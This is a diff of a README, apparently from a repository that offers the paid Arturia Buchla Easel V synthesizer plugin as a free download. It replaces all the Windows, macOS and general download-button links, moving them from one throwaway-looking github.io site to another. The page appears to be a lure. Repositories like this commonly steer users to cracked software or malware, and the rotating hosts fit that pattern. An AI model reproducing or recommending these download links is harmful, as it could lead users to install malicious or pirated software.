@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Arturia Buchla Easel V](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_ARTURIA_BUCHLA_EASEL_V-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download Arturia Buchla Easel V](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_ARTURIA_BUCHLA_EASEL_V-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Arturia Buchla Easel V** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-DC2626?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-DC2626?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-DC2626?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-DC2626?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
